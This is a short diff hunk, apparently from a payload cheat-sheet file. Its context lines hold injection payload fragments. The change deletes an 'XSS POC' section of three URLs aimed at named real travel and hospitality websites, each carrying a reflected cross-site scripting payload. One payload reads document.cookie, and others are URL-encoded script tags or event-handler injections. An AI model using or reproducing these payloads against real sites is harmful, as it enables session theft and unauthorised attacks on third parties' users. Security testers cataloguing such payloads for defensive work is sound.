@@ -133,10 +133,4 @@ pwd)
 *)((*
 *) )%00
 
-XSS POC:
---------
-https://traveler.marriott.com/?s="><img%20src=x%20onerror=prompt(document.cookie);>
-https://zolostays.com/careers/%3B%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%39%37%31%36%29%3C%2F%73%63%72%69%70%74%3E
-https://in.trip.com/m/flights/delhi-to-auckland/tickets-DEL-AKL/?dcity=delhi&acity=auckland&dcitycode=DEL&acitycode=%3B'"1<!--><%2FTitle%2F<%2FTextarea%2F<%2FScript%2F><%2FIframe><Details%2FOpen%2FOnToggle%3D(confirm)(1)-->&ddate=2024-12-09&dairport=DEL&aairport=AKL&triptype=1&classtype=0&adult=1&searchboxarg=t&sort=price
-
 
